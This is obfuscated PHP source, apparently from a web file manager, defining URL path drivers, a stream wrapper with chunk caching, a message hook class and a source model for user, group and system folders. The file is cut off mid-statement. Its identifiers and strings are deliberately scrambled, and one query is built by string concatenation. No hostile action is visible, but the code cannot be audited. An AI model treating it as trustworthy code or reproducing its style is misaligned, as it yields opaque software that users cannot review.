<?php
 goto aİè“¥Âˆ—; Eğ„¹Ù¥¡…: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Â¨ş²‡¦ = false) { } public function exist($‡ˆ½ƒ–) { $™·üğ°á = $this->info($‡ˆ½ƒ–); return $™·üğ°á[$_SERVER[£ğ°ÖØø][232]]; } public function isFile($Õ‡”¸®í) { $Á‘ì¡› = $this->info($Õ‡”¸®í); return $Á‘ì¡›[$_SERVER[£ğ°ÖØø][232]]; } public function isFolder($ğ™µëæº) { return !1; } public function size($ˆÑ¡Ôì³) { $íªˆˆúĞ = $this->info($ˆÑ¡Ôì³); return $íªˆˆúĞ[$_SERVER[£ğ°ÖØø][79]]; } public function info($°ºìåöÜ) { return $this->infoParse($°ºìåöÜ); } public function infoAuth($ò÷‡·¯­) { return $this->infoParse($ò÷‡·¯­); } public function infoWithChildren($ğë¹§ƒæ) { return $this->infoParse($ğë¹§ƒæ); } public function infoFull($èÀìÍö) { return $this->infoParse($èÀìÍö); } private function infoParse($İÁÒ´¹‡) { $¡Š›’ÃÍ =& $_SERVER[£ğ°ÖØø]; $¥‰áö‹Ò = $this->header($İÁÒ´¹‡); if (!$¥‰áö‹Ò || !$¥‰áö‹Ò[$¡Š›’ÃÍ[814]]) { return !1; } $Á›®Şçä = _get($¥‰áö‹Ò, $¡Š›’ÃÍ[413], 0); $²¡í¤µ = array($¡Š›’ÃÍ[32] => $¥‰áö‹Ò[$¡Š›’ÃÍ[32]], $¡Š›’ÃÍ[87] => $İÁÒ´¹‡, $¡Š›’ÃÍ[33] => $¡Š›’ÃÍ[230], $¡Š›’ÃÍ[79] => intval($Á›®Şçä), $¡Š›’ÃÍ[169] => get_path_ext($¥‰áö‹Ò[$¡Š›’ÃÍ[32]]), $¡Š›’ÃÍ[1436] => $Á›®Şçä > 0 && $¥‰áö‹Ò[$¡Š›’ÃÍ[1586]], $¡Š›’ÃÍ[1437] => !1); return $²¡í¤µ; } private function header($Ò†ƒÍöö) { $éŸäßûœ =& $_SERVER[£ğ°ÖØø]; if (isset(self::$_cacheHeader[$Ò†ƒÍöö])) { return self::$_cacheHeader[$Ò†ƒÍöö]; } $µÚÁç‡ï = isset($GLOBALS[$éŸäßûœ[1587]]) ? $GLOBALS[$éŸäßûœ[1587]] : !1; $GLOBALS[$éŸäßûœ[1587]] = !0; self::$_cacheHeader[$Ò†ƒÍöö] = url_header($Ò†ƒÍöö); $GLOBALS[$éŸäßûœ[1587]] = $µÚÁç‡ï; return self::$_cacheHeader[$Ò†ƒÍöö]; } public function hashSimple($ñš°›Â¡, $ˆ®î•Ûî = false) { $Î…¯Â¶ =& $_SERVER[£ğ°ÖØø]; $í¥¼° » = $this->info($ñš°›Â¡); if (!$í¥¼° » || !$í¥¼° »[$Î…¯Â¶[232]]) { return !1; } $«í¬ÜŠ¹ = $í¥¼° »[$Î…¯Â¶[79]]; $§÷¼êçÖ = 200; $…™ê‡‰ = 50; if ($«í¬ÜŠ¹ <= $§÷¼êçÖ * $…™ê‡‰) { return md5($this->fileSubstr($ñš°›Â¡, 0, $«í¬ÜŠ¹)) . $«í¬ÜŠ¹; } $€ıØ™‡å = intval($«í¬ÜŠ¹ / $…™ê‡‰); $åû˜ŒûÓ = $Î…¯Â¶[12]; $ø£Ë¦Õˆ = timeFloat(); $åñ¯‚†˜ = 15; for ($ÙâßÜæß = 0; $ÙâßÜæß < $…™ê‡‰; $ÙâßÜæß++) { if (timeFloat() - $ø£Ë¦Õˆ > $åñ¯‚†˜) { return !1; } $‰ÖŠÍ = $this->fileSubstr($ñš°›Â¡, $€ıØ™‡å * $ÙâßÜæß, $§÷¼êçÖ); if (!$‰ÖŠÍ) { return !1; } $åû˜ŒûÓ .= $‰ÖŠÍ; } $åû˜ŒûÓ .= $this->fileSubstr($ñš°›Â¡, $«í¬ÜŠ¹ - $§÷¼êçÖ, $§÷¼êçÖ); return md5($åû˜ŒûÓ) . $«í¬ÜŠ¹; } public function getContent($ì¹–Šá’) { return $this->fileSubstr($ì¹–Šá’); } public function fileSubstr($ÏÇãÌ’ä, $»áĞÅó¶ = 0, $èÜõåô  = -1) { $ÆèŞ„‰† =& $_SERVER[£ğ°ÖØø]; $…œË“¯É = $this->info($ÏÇãÌ’ä); if (!$…œË“¯É || !$…œË“¯É[$ÆèŞ„‰†[232]] && $…œË“¯É[$ÆèŞ„‰†[79]] > 1024 * 1024 * 10) { return !1; } if ($èÜõåô  === -1) { $èÜõåô  = $…œË“¯É[$ÆèŞ„‰†[79]]; } if ($èÜõåô  == 0) { return $ÆèŞ„‰†[12]; } $úÊŠ ’™ = array($ÆèŞ„‰†[1588] . $»áĞÅó¶ . $ÆèŞ„‰†[849] . ($»áĞÅó¶ + $èÜõåô  - 1)); $òêŒ“ô = url_request($ÏÇãÌ’ä, $ÆèŞ„‰†[261], !1, $úÊŠ ’™, !1, !1, 30); return $òêŒ“ô[$ÆèŞ„‰†[1270]] ? $òêŒ“ô[$ÆèŞ„‰†[1270]] : $ÆèŞ„‰†[12]; } public function download($àÄ¨•¬, $Şú†ßÇ) { Downloader::start($àÄ¨•¬, $Şú†ßÇ); return $Şú†ßÇ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÜŠ¦Šà, $¥Ö•Şüˆ = '') { $this->info = $this->info($ÜŠ¦Šà); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[£ğ°ÖØø][87]]; $this->pathOpen = $ÜŠ¦Šà; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÜŠ¦Šà])) { self::$_chunkBuffer[$ÜŠ¦Šà] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($“‡Ú×ù¦) { $®„äûƒ = $this->fileSubstr($this->pose, $“‡Ú×ù¦); $this->pose += strlen($®„äûƒ); return $®„äûƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($‡Û¼å˜, $ˆ¿”ªµ) { $¡Ñ¤ÈÙË =& $_SERVER[£ğ°ÖØø]; if ($ˆ¿”ªµ == SEEK_SET) { $this->pose = $‡Û¼å˜; } else { if ($ˆ¿”ªµ == SEEK_CUR) { $this->pose += $‡Û¼å˜; } else { if ($ˆ¿”ªµ == SEEK_END) { $this->pose = $this->info[$¡Ñ¤ÈÙË[79]] + intval($‡Û¼å˜); } } } if ($‡Û¼å˜ < 0) { $this->pose = $this->info[$¡Ñ¤ÈÙË[79]] + $‡Û¼å˜; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[£ğ°ÖØø][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($·‡ú, $¯¦ú…ä¦) { $¥¯ñÎì =& $_SERVER[£ğ°ÖØø]; $’ÌÀáì  = $this->info($·‡ú); return array($¥¯ñÎì[1589] => 0, $¥¯ñÎì[1590] => 0, $¥¯ñÎì[16] => 32768 + 511, $¥¯ñÎì[1591] => 0, $¥¯ñÎì[1592] => 0, $¥¯ñÎì[1593] => 0, $¥¯ñÎì[1594] => 0, $¥¯ñÎì[79] => $’ÌÀáì [$¥¯ñÎì[79]], $¥¯ñÎì[1595] => $’ÌÀáì [$¥¯ñÎì[1435]], $¥¯ñÎì[1551] => $’ÌÀáì [$¥¯ñÎì[88]], $¥¯ñÎì[1550] => $’ÌÀáì [$¥¯ñÎì[231]], $¥¯ñÎì[1596] => 0, $¥¯ñÎì[1597] => 0); } static $fileInfo = array(); public function info($²ŸŸ¢÷¤) { $ÅµÁ¨¦± = $_SERVER[£ğ°ÖØø][1598]; if (isset(self::$fileInfo[$²ŸŸ¢÷¤])) { return self::$fileInfo[$²ŸŸ¢÷¤]; } if (substr($²ŸŸ¢÷¤, 0, strlen($ÅµÁ¨¦±)) != $ÅµÁ¨¦±) { return !1; } self::$fileInfo[$²ŸŸ¢÷¤] = IO::info(substr($²ŸŸ¢÷¤, strlen($ÅµÁ¨¦±))); return self::$fileInfo[$²ŸŸ¢÷¤]; } public static function read($‹¼å¼Ì, $ó×µÏÆ, $Ìèë‰£) { if (!isset(self::$_fopenCache[$‹¼å¼Ì])) { $Ùˆ¬ˆ“û = new StreamWrapperIO(); $Ùˆ¬ˆ“û->stream_open($‹¼å¼Ì); self::$_fopenCache[$‹¼å¼Ì] = $Ùˆ¬ˆ“û; } $Ùˆ¬ˆ“û = self::$_fopenCache[$‹¼å¼Ì]; return $Ùˆ¬ˆ“û->fileSubstr($ó×µÏÆ, $Ìèë‰£); } public static function _read($Ÿ×¤èû, $ğÂöœšç, $ƒ®ßû­ï) { $Ï‹¤ºŸ¬ =& $_SERVER[£ğ°ÖØø]; $Ğ¤±À„Û = fopen($Ÿ×¤èû, $Ï‹¤ºŸ¬[1439]); if (!$Ğ¤±À„Û) { return $Ï‹¤ºŸ¬[12]; } $µ¹ıñ = 8192; fseek($Ğ¤±À„Û, $ğÂöœšç, SEEK_SET); $ğê³õì‚ = $Ï‹¤ºŸ¬[12]; $ùÛÈÓú = 0; while ($ùÛÈÓú < $ƒ®ßû­ï) { $îñ”›Úö = min($µ¹ıñ, $ƒ®ßû­ï - $ùÛÈÓú); $ğê³õì‚ .= fread($Ğ¤±À„Û, $îñ”›Úö); $ùÛÈÓú += $îñ”›Úö; } fclose($Ğ¤±À„Û); return $ğê³õì‚; } public function fileSubstr($êºĞ¸†¥, $ßğ…äßÂ) { $ÊüÀ´î™ =& $_SERVER[£ğ°ÖØø]; $µ­ö‚˜ = $this->info[$ÊüÀ´î™[79]]; $Š·ú»Áî = $êºĞ¸†¥; $¸İš‡á = $ßğ…äßÂ; if ($êºĞ¸†¥ < 0) { $êºĞ¸†¥ = $µ­ö‚˜ + $êºĞ¸†¥; } if ($ßğ…äßÂ === !1) { $ßğ…äßÂ = $µ­ö‚˜ - $êºĞ¸†¥; } if ($êºĞ¸†¥ + $ßğ…äßÂ > $µ­ö‚˜) { $ßğ…äßÂ = $µ­ö‚˜ - $êºĞ¸†¥; } if ($ßğ…äßÂ <= 0) { return $ÊüÀ´î™[12]; } if ($êºĞ¸†¥ < 0 || $êºĞ¸†¥ >= $µ­ö‚˜ || $ßğ…äßÂ <= 0 || $ßğ…äßÂ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\151\154\145\122\x65\x61\144\x20\x65\x72\x72\157\162\x21\x20\163\164\141\162\164\x3d{$êºĞ¸†¥}\x3b\154\x65\x6e\x67\x74\150\x3d{$ßğ…äßÂ}\73\40\x73\x69\x7a\x65\75{$µ­ö‚˜}\x3b"); } $ÕïïË±“ = 64 * 1024; $øìãÆè€ =& self::$_chunkBuffer[$this->path]; if (!$øìãÆè€) { $øìãÆè€ = array(); } $¸Ú¯ƒ©å = 0; $ûˆ‘éÖ = 0; $¡ƒ¡ã®µ = $ÊüÀ´î™[12]; foreach ($øìãÆè€ as $¸Ú¯ƒ©å => $¡ƒ¡ã®µ) { $¸Ú¯ƒ©å = intval($¸Ú¯ƒ©å); $ûˆ‘éÖ = $¸Ú¯ƒ©å + strlen($¡ƒ¡ã®µ); if ($êºĞ¸†¥ >= $ûˆ‘éÖ) { continue; } if ($êºĞ¸†¥ >= $¸Ú¯ƒ©å && $êºĞ¸†¥ + $ßğ…äßÂ <= $ûˆ‘éÖ) { return substr($¡ƒ¡ã®µ, $êºĞ¸†¥ - $¸Ú¯ƒ©å, $ßğ…äßÂ); } break; } if (count($øìãÆè€) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÊüÀ´î™[1599], $ÊüÀ´î™[1600] . count($øìãÆè€) . "\x3b\163\x74\141\x72\164\x3d{$êºĞ¸†¥}\x2c\x6c\x65\x6e\147\x74\x68\x3d{$ßğ…äßÂ}\x3b\x70\x6f\x73\145\72{$¸Ú¯ƒ©å}\176{$ûˆ‘éÖ}"); throw new Exception($ÊüÀ´î™[1601]); } $Ÿ×º­òÀ = intval($êºĞ¸†¥ / $ÕïïË±“) * $ÕïïË±“; $›€à¦ï” = ceil(($êºĞ¸†¥ + $ßğ…äßÂ) / $ÕïïË±“) * $ÕïïË±“ - $Ÿ×º­òÀ; $Û¥ÛÚ÷ï = IO::fileSubstr($this->path, $Ÿ×º­òÀ, $›€à¦ï”); $øìãÆè€[$Ÿ×º­òÀ . $ÊüÀ´î™[12]] = $Û¥ÛÚ÷ï; ksort($øìãÆè€); $ï³¹îì’ = substr($Û¥ÛÚ÷ï, $êºĞ¸†¥ - $Ÿ×º­òÀ, $ßğ…äßÂ); return $ï³¹îì’; } private function log($¢„ùï¤ò, $ÒáÆÌİ) { $¯¦ı‹Ñğ =& $_SERVER[£ğ°ÖØø]; $Ùæ©¿øï = timeFloat() - $this->timeStart; write_log(sprintf($¯¦ı‹Ñğ[1602], $¢„ùï¤ò, $this->info[$¯¦ı‹Ñğ[32]], $Ùæ©¿øï, $ÒáÆÌİ), $¯¦ı‹Ñğ[1247]); } } class Message { function __construct() { } public function send($Ñ®©¢½¾ = '', $¼òêâ´ = array(), $Ã¡ìúòË = "\164\x65\x78\164") { $à¤ß†©˜ =& $_SERVER[£ğ°ÖØø]; $ä½¨ñˆİ = array($à¤ß†©˜[33] => $à¤ß†©˜[1603], $à¤ß†©˜[171] => $Ñ®©¢½¾); if (in_array($Ã¡ìúòË, array($à¤ß†©˜[1603], $à¤ß†©˜[1604]))) { $ä½¨ñˆİ[$à¤ß†©˜[33]] = $Ã¡ìúòË; } $¼òêâ´ = array($à¤ß†©˜[587] => isset($¼òêâ´[$à¤ß†©˜[587]]) ? $¼òêâ´[$à¤ß†©˜[587]] : $à¤ß†©˜[12], $à¤ß†©˜[671] => isset($¼òêâ´[$à¤ß†©˜[671]]) ? $¼òêâ´[$à¤ß†©˜[671]] : $à¤ß†©˜[12]); if (empty($Ñ®©¢½¾) || empty($¼òêâ´[$à¤ß†©˜[587]]) && empty($¼òêâ´[$à¤ß†©˜[671]])) { return !1; } $ÚÒ æ¶ = array($à¤ß†©˜[1531] => $ä½¨ñˆİ, $à¤ß†©˜[1605] => $¼òêâ´); Hook::trigger($à¤ß†©˜[1606], $ÚÒ æ¶); } } goto bÁ®Œ––†•; Cñ²œ†”Ï: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($òÈÙş©í) { $³Ã°ÉÚâ =& $_SERVER[£ğ°ÖØø]; $ã±Ó¯ùÍ = Model($³Ã°ÉÚâ[586])->where(array($³Ã°ÉÚâ[1746] => $òÈÙş©í))->find(); $«ŠÉÔ¤Æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $òÈÙş©í, $ã±Ó¯ùÍ[$³Ã°ÉÚâ[32]]); $this->userDesktopAdd($«ŠÉÔ¤Æ); return $«ŠÉÔ¤Æ; } public function userDesktopAdd($¹–Ùë´) { $Ùóó ³ =& $_SERVER[£ğ°ÖØø]; $ñ…š¢©Ä = LNG($Ùóó ³[2233]); $°¹Îø = $this->mkdir($¹–Ùë´, $ñ…š¢©Ä); $this->metaSet($°¹Îø, $Ùóó ³[2234], $Ùóó ³[91]); $this->metaSet($¹–Ùë´, $Ùóó ³[2235], $°¹Îø); } public function userPathSafeAdd($ÑÀÑ”úş) { $¼ ¹îìÔ =& $_SERVER[£ğ°ÖØø]; $Ö–˜¢” = Model($¼ ¹îìÔ[586])->getInfoFull($ÑÀÑ”úş); if (!$Ö–˜¢”) { return !1; } if (_get($Ö–˜¢”, $¼ ¹îìÔ[608])) { return $Ö–˜¢”[$¼ ¹îìÔ[548]][$¼ ¹îìÔ[2236]]; } $§²ÌñÍ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÑÀÑ”úş, $¼ ¹îìÔ[2237], $¼ ¹îìÔ[515]); Model($¼ ¹îìÔ[586])->metaSet($ÑÀÑ”úş, $¼ ¹îìÔ[2236], $§²ÌñÍ); $this->metaSet($§²ÌñÍ, $¼ ¹îìÔ[2238], $ÑÀÑ”úş); return $§²ÌñÍ; } public function groupRootAdd($Ì®º‹Š®) { $òœÍ…ï» =& $_SERVER[£ğ°ÖØø]; $ÙÉş¨¼ = Model($òœÍ…ï»[594])->where(array($òœÍ…ï»[2046] => $Ì®º‹Š®))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ì®º‹Š®, $ÙÉş¨¼[$òœÍ…ï»[32]]); } public function systemRootPathAdd($ÍŸÀ¦ÏÛ) { if ($ÍŸÀ¦ÏÛ != $_SERVER[£ğ°ÖØø][614]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÍŸÀ¦ÏÛ); } public function userRootRemove($£Öú²±È) { $–İÅ—ô = $this->targetSourceRoot(SourceModel::TYPE_USER, $£Öú²±È, !0); foreach ($–İÅ—ô as $ÕĞ•¯³°) { if (!$ÕĞ•¯³°) { continue; } $this->remove($ÕĞ•¯³°[$_SERVER[£ğ°ÖØø][193]], !1); } } public function groupRootRemove($¿Âøˆäí) { $³¤­ó‡Š = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¿Âøˆäí); if (!$³¤­ó‡Š) { return; } $this->remove($³¤­ó‡Š[$_SERVER[£ğ°ÖØø][193]], !1); } private function _mkdirRoot($È–¤ï«ó, $ë”±¯ˆŠ, $£ì±†òÔ, $·÷ºê¸§ = '') { $œæÛ€— =& $_SERVER[£ğ°ÖØø]; $éÙá¥­¤ = defined($œæÛ€—[2180]) ? USER_ID : 0; $¸»§œ« = array($œæÛ€—[486] => 0, $œæÛ€—[657] => $È–¤ï«ó, $œæÛ€—[658] => $ë”±¯ˆŠ, $œæÛ€—[655] => 1, $œæÛ€—[659] => $éÙá¥­¤, $œæÛ€—[660] => $éÙá¥­¤, $œæÛ€—[656] => $·÷ºê¸§, $œæÛ€—[661] => $œæÛ€—[603], $œæÛ€—[513] => 0, $œæÛ€—[626] => 0, $œæÛ€—[551] => 0, $œæÛ€—[662] => $œæÛ€—[12]); if ($Ã¡«Æ Ô = $this->where($¸»§œ«)->find()) { return $Ã¡«Æ Ô[$œæÛ€—[193]]; } $ŠäŞ„£ = "\115\157\x64\x65\x6c\x53\x6f\165\x72\x63\x65\x2e\155\x6b\x64\x69\162\122\157\157\164\56{$È–¤ï«ó}\x2e{$ë”±¯ˆŠ}\x2e" . $£ì±†òÔ; CacheLock::lock($ŠäŞ„£); $¸»§œ«[$œæÛ€—[32]] = $£ì±†òÔ; $ÑÀ×Îø— = $this->add($¸»§œ«); $³©Üõ¢¯ = array($œæÛ€—[663] => short_id($ÑÀ×Îø—)); $this->where(array($œæÛ€—[500] => $ÑÀ×Îø—))->save($³©Üõ¢¯); CacheLock::unlock($ŠäŞ„£); return $ÑÀ×Îø—; } private function targetSourceRoot($¾öó£ç­, $€î¬¹Ü, $çÛÖÎï§ = false) { $’˜êÏŸÃ =& $_SERVER[£ğ°ÖØø]; $Ö·¾ŸŞË = array($’˜êÏŸÃ[486] => 0, $’˜êÏŸÃ[657] => $¾öó£ç­, $’˜êÏŸÃ[658] => $€î¬¹Ü); if ($çÛÖÎï§) { $¶ŠÂ°¤ñ = $this->where($Ö·¾ŸŞË)->select(); return $¶ŠÂ°¤ñ ? $¶ŠÂ°¤ñ : array(); } $™ˆ÷ü¶ = $this->where($Ö·¾ŸŞË)->find(); return $™ˆ÷ü¶ ? $™ˆ÷ü¶ : array(); } public function sourceRootGroup($½ø³™ÂŸ) { $ò´Å¨çõ =& $_SERVER[£ğ°ÖØø]; if (is_string($½ø³™ÂŸ)) { $½ø³™ÂŸ = array($½ø³™ÂŸ); } $ÈÎùÄÃ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $½ø³™ÂŸ, $ò´Å¨çõ[220]); $ÕÖ¡Ëâ = array($ò´Å¨çõ[454] => $ÈÎùÄÃ, $ò´Å¨çõ[451] => array($ò´Å¨çõ[822] => count($½ø³™ÂŸ))); $this->_listDataApply($ÕÖ¡Ëâ[$ò´Å¨çõ[454]]); $this->_listMake($ÕÖ¡Ëâ); return array_to_keyvalue($ÕÖ¡Ëâ[$ò´Å¨çõ[85]], $ò´Å¨çõ[578]); } public function mkfile($È˜¬²„ã, $ºÜ¢Ëö, $˜„±ÓÊ• = '', $’ˆ·çÆó = REPEAT_RENAME) { $ÙõÊÙğÚ =& $_SERVER[£ğ°ÖØø]; $œßóåÕ³ = Model($ÙõÊÙğÚ[683])->addFileByContent($˜„±ÓÊ•, $ºÜ¢Ëö); return $this->_createFileCall($È˜¬²„ã, $ºÜ¢Ëö, $œßóåÕ³, $’ˆ·çÆó, $ÙõÊÙğÚ[1411]); } public function addFile($ªÀÛà›ö, $·ÃÅ«Ñï, $Ìüí…ü, $¡˜¡æÙß = false, $œ©ÜÊßÏ = REPEAT_RENAME) { $ÀŒçœò = Model($_SERVER[£ğ°ÖØø][683])->addFile($·ÃÅ«Ñï, $Ìüí…ü, $¡˜¡æÙß); return $this->_createFileCall($ªÀÛà›ö, $Ìüí…ü, $ÀŒçœò, $œ©ÜÊßÏ); } public function addFileByFileID($°éÇ  ›, $í×ùØìÜ, $’Å÷€À, $ÏÉÓŒÅ» = REPEAT_RENAME) { $î´şÓÃ =& $_SERVER[£ğ°ÖØø]; $ë€ì¿ôÄ = Model($î´şÓÃ[683])->find($í×ùØìÜ); Model($î´şÓÃ[683])->linkAdd($í×ùØìÜ); return $this->_createFileCall($°éÇ  ›, $’Å÷€À, $ë€ì¿ôÄ, $ÏÉÓŒÅ»); } public function addFileByRemote($ÅÃêÌş, $¯¾©—ïè, $Ğë±úé„, $ª§†Ãú = array(), $Åæ¬¡¶ë = REPEAT_RENAME) { $Ší³ğËş = Model($_SERVER[£ğ°ÖØø][683])->addFileByRemote($¯¾©—ïè, $Ğë±úé„, $ª§†Ãú); return $this->_createFileCall($ÅÃêÌş, $Ğë±úé„, $Ší³ğËş, $Åæ¬¡¶ë); } private function _createFileCall($æÛøØ£, $ê•œêµ™, $¤Ï—”İ¤, $‹—ÚÓÖ, $°Ş£ùàí = "\165\160\x6c\157\x61\144") { $Ã¯Ñßã° =& $_SERVER[£ğ°ÖØø]; $Õ®…›ôû = !1; $this->setMasterDB(); $this->lockWriteStart($æÛøØ£, $ê•œêµ™); $µşš™² = $this->fileNameExist($æÛøØ£, $ê•œêµ™); $æûãÖĞÁ = $this->_createFile($æÛøØ£, $ê•œêµ™, $¤Ï—”İ¤, $‹—ÚÓÖ, $Õ®…›ôû); if (!$Õ®…›ôû) { Model($Ã¯Ñßã°[553])->remove($¤Ï—”İ¤[$Ã¯Ñßã°[550]]); } if ($Õ®…›ôû && $æûãÖĞÁ && $æûãÖĞÁ != $µşš™²) { Model($Ã¯Ñßã°[2206])->eventCreate($æûãÖĞÁ, $°Ş£ùàí); } $this->lockWriteEnd($æÛøØ£, $ê•œêµ™); return $æûãÖĞÁ; } public function mkdir($±˜¬ Ê…, $°ğöŸÎô, $àªÍ†¾Š = REPEAT_SKIP) { $±ÚĞæ½„ =& $_SERVER[£ğ°ÖØø]; $this->setMasterDB(); $™ğ–©Ãç = $this->sourceInfo($±˜¬ Ê…); if (!$™ğ–©Ãç) { return !1; } $this->lockWriteStart($±˜¬ Ê…, $°ğöŸÎô); if ($àªÍ†¾Š !== !1) { $âã›º²¬ = $this->fileNameExist($±˜¬ Ê…, $°ğöŸÎô); if ($âã›º²¬ && $àªÍ†¾Š != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($±˜¬ Ê…, $°ğöŸÎô); return $âã›º²¬; } $°ğöŸÎô = $this->fileNameAuto($±˜¬ Ê…, $°ğöŸÎô, $àªÍ†¾Š); } $ÙãÌÌä˜ = array($±ÚĞæ½„[655] => 1, $±ÚĞæ½„[503] => $°ğöŸÎô, $±ÚĞæ½„[656] => $±ÚĞæ½„[12], $±ÚĞæ½„[551] => 0, $±ÚĞæ½„[626] => 0); $ŞÜßê = $this->_addSource($ÙãÌÌä˜, $™ğ–©Ãç); Model($±ÚĞæ½„[2206])->eventCreate($ŞÜßê, $±ÚĞæ½„[1412]); $this->lockWriteEnd($±˜¬ Ê…, $°ğöŸÎô); return $ŞÜßê; } public function listSourceRoot($è¥ù£ô, $Ë»ÀÎğŠ, $ıÙÚŒ¢¸ = "\x73\157\x75\162\143\x65\111\104\x2c\164\141\x72\147\145\x74\111\104\54\x73\x69\x7a\x65") { $±¡ØÎ¸¸ =& $_SERVER[£ğ°ÖØø]; $÷‹—ùôì = $±¡ØÎ¸¸[463]; $â€¸ÇÃÁ = array(); $©¢¬ È™ = 1024 * 50; $¶÷º¿»’ = is_array($¶÷º¿»’) ? $¶÷º¿»’ : array(); $ãô‚Ë = count($Ë»ÀÎğŠ); $†î“Ğ‰Á = $this->tablePrefix . $±¡ØÎ¸¸[2239]; for ($²Û¡ßƒ = 0; $²Û¡ßƒ < $ãô‚Ë; $²Û¡ßƒ++) { $ìƒí±ì = $Ë»ÀÎğŠ[$²Û¡ßƒ]; $÷‹—ùôì .= "\123\105\x4c\x45\x43\x54\x20\x2a\x20\106\x52\x4f\115\x20\x28\x53\105\x4c\105\103\124\x20{$ıÙÚŒ¢¸}\x20\x46\122\x4f\115\40\140{$†î“Ğ‰Á}\140\x20\127\110\x45\x52\x45\40"; $÷‹—ùôì .= "\x60\x70\141\162\145\156\x74\x49\x44\140\x3d\60\40\x41\x4e\x44\40\140\x74\x61\162\x67\145\x74\x49\104\x60\x3d{$ìƒí±ì}\40\x41\116\x44\x20\x60\164\141\162\147\x65\164\124\x79\160\x65\x60\75{$è¥ù£ô}\40\x61\156\144\40\x66\151\x6c\145\x54\x79\x70\145\75\x27\47\x20\x6c\x69\x6d\x69\164\40\x31\x29\x20\x61\x73\x20\164\x62\137{$²Û¡ßƒ}\40\x55\x4e\x49\117\116\40\x41\114\114\x20"; if ((strlen($÷‹—ùôì) >= $©¢¬ È™ || $²Û¡ßƒ == $ãô‚Ë - 1) && $÷‹—ùôì) { $÷‹—ùôì = substr($÷‹—ùôì, 0, -strlen($±¡ØÎ¸¸[1099])); $¿•ˆ¬© = $this->query($÷‹—ùôì); $÷‹—ùôì = $±¡ØÎ¸¸[12]; $â€¸ÇÃÁ = array_merge($â€¸ÇÃÁ, $¿•ˆ¬©); } } return $â€¸ÇÃÁ; } private function _createFile($šÁ˜îÅ, $Ì²‰—·›, $½¶¬’­, $‹öïì‘é, &$Ü‹°²¢Ø) { $Ş»¹«Á =& $_SERVER[£ğ°ÖØø]; $úÈ¢»¢ = $this->sourceInfo($šÁ˜îÅ); if (!$½¶¬’­ || !$úÈ¢»¢) { return !1; } if ($‹öïì‘é !== !1) { $¥˜ÒìÎ‡ = $this->fileNameExist($šÁ˜îÅ, $Ì²‰—·›); } $Ü‹°²¢Ø = !0; if ($‹öïì‘é && $¥˜ÒìÎ‡) { if ($‹öïì‘é == REPEAT_SKIP) { $Ü‹°²¢Ø = !1; return $¥˜ÒìÎ‡; } else { if ($‹öïì‘é == REPEAT_REPLACE) { $òµ÷ã‹… = $this->sourceInfo($¥˜ÒìÎ‡); $Óí¼Ë™¼ = $this->fileHistory($òµ÷ã‹…, $½¶¬’­[$Ş»¹«Á[550]], $½¶¬’­[$Ş»¹«Á[79]]); if (!$Óí¼Ë™¼) { $Ü‹°²¢Ø = !1; } else { $this->folderSizeReset($šÁ˜îÅ); } return $¥˜ÒìÎ‡; } else { $Ì²‰—·› = $this->fileNameAuto($šÁ˜îÅ, $Ì²‰—·›, $‹öïì‘é, !1); } } } $°‰ÎÀ = array($Ş»¹«Á[655] => 0, $Ş»¹«Á[503] => $Ì²‰—·›, $Ş»¹«Á[656] => substr(get_path_ext($Ì²‰—·›), 0, 10), $Ş»¹«Á[551] => $½¶¬’­[$Ş»¹«Á[550]], $Ş»¹«Á[626] => $½¶¬’­[$Ş»¹«Á[79]]); $°ÁÆÚœæ = $this->_addSource($°‰ÎÀ, $úÈ¢»¢); $this->folderSizeReset($šÁ˜îÅ, intval($°‰ÎÀ[$Ş»¹«Á[79]])); return $°ÁÆÚœæ; } protected function fileHistory($µù»Ïö, $ŸÁĞéÆì, $µë¿‘¿ö) { $““å·–¶ =& $_SERVER[£ğ°ÖØø]; if ($µù»Ïö[$““å·–¶[550]] == $ŸÁĞéÆì) { return !1; } $this->checkLock($µù»Ïö[$““å·–¶[193]], $ŸÁĞéÆì); Model($““å·–¶[2240])->addHistory($µù»Ïö); $í…à•ß¹ = array($““å·–¶[660] => USER_ID, $““å·–¶[507] => time(), $““å·–¶[550] => $ŸÁĞéÆì, $““å·–¶[79] => $µë¿‘¿ö); $this->where(array($““å·–¶[500] => $µù»Ïö[$““å·–¶[193]]))->save($í…à•ß¹); $this->sourceCacheClear($µù»Ïö[$““å·–¶[193]]); return !0; } public function checkLock($éáŸáˆ, $¾¤§‡„¥) { $œ¹“²ÊÉ =& $_SERVER[£ğ°ÖØø]; $¨èà“˜µ = $this->pathInfo($éáŸáˆ); if (!$this->fileIsLock($¨èà“˜µ, !0)) { return; } $µÌÂúğ÷ = Session::get($œ¹“²ÊÉ[2241]); $—ˆ§‡×¢ = substr($¨èà“˜µ[$œ¹“²ÊÉ[32]], 0, -1 - strlen($¨èà“˜µ[$œ¹“²ÊÉ[169]])) . $œ¹“²ÊÉ[1276] . $µÌÂúğ÷ . $œ¹“²ÊÉ[10] . $¨èà“˜µ[$œ¹“²ÊÉ[169]]; $Æ„àÇ‘ = Model($œ¹“²ÊÉ[683])->find($¾¤§‡„¥); $this->_createFileCall($¨èà“˜µ[$œ¹“²ÊÉ[192]], $—ˆ§‡×¢, $Æ„àÇ‘, REPEAT_REPLACE, $œ¹“²ÊÉ[1411]); $ŞèßØ–ğ = 